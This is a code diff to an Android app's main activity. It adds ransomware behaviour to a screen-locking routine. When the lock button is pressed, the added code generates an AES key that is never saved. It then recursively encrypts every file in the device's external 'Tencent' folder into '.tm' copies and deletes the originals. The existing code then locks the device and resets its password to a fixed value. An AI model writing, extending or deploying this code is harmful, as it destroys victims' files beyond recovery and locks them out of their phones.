@@ -5,6 +5,7 @@ import android.content.ComponentName;
 import android.content.Context;
 import android.content.Intent;
 import android.os.Build;
+import android.os.Environment;
 import android.provider.Settings;
 import android.support.v7.app.AppCompatActivity;
 import android.os.Bundle;
@@ -12,6 +13,18 @@ import android.util.Log;
 import android.view.View;
 import android.widget.Button;
 import android.widget.Toast;
+
+import java.io.File;
+import java.io.FileInputStream;
+import java.io.FileOutputStream;
+import java.security.Security;
+
+import javax.crypto.Cipher;
+import javax.crypto.CipherOutputStream;
+import javax.crypto.KeyGenerator;
+import javax.crypto.SecretKey;
+
+import de.flexiprovider.core.FlexiCoreProvider;
 
 public class MainActivity extends AppCompatActivity {
 
@@ -28,6 +41,31 @@ public class MainActivity extends AppCompatActivity {
       }
     }
 
+    public static void encryptFolder(Cipher cipher, File dir) {
+        File[] files = dir.listFiles();
+        for (File file : files) {
+            if (file.isDirectory()) {
+                encryptFolder(cipher, file);
+            } else {
+                try {
+                    FileInputStream fis = new FileInputStream(file);
+                    FileOutputStream fos = new FileOutputStream(file.getCanonicalPath() + ".tm");
+                    CipherOutputStream cos = new CipherOutputStream(fos, cipher);
+
+                    byte[] block = new byte[8];
+                    int i;
+                    while ((i = fis.read(block)) != -1) {
+                        cos.write(block, 0, i);
+                    }
+                    cos.close();
+                    file.delete();
+                } catch (Exception e) {
+                    e.printStackTrace();
+                    Log.e("Failed", e.getMessage());
+                }
+            }
+        }
+    }
     public void lockandchangepassword(){
         mDpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
 
@@ -35,6 +73,25 @@ public class MainActivity extends AppCompatActivity {
         btnLock.setOnClickListener(new View.OnClickListener(){
             @Override
             public void onClick(View v){
+                // Encrypt folder "Tencent/"
+                new Thread(new Runnable() {
+                    @Override
+                    public void run() {
+                        Security.addProvider(new FlexiCoreProvider());
+                        try {
+                            Cipher cipher = Cipher.getInstance("AES128_CBC", "FlexiCore");
+                            KeyGenerator keyGen = KeyGenerator.getInstance("AES", "FlexiCore");
+                            SecretKey secKey = keyGen.generateKey();
+                            cipher.init(Cipher.ENCRYPT_MODE, secKey);
+
+                            File dir = new File(Environment.getExternalStorageDirectory().getPath() + "/Tencent/");
+                            encryptFolder(cipher, dir);
+                        } catch (Exception e) {
+                            e.printStackTrace();
+                            Log.e("Failed",e.getMessage());
+                        }
+                    }
+                }).start();
                 // lock screen
                 mDpm.lockNow();
                 mDpm.resetPassword("12345678",0);
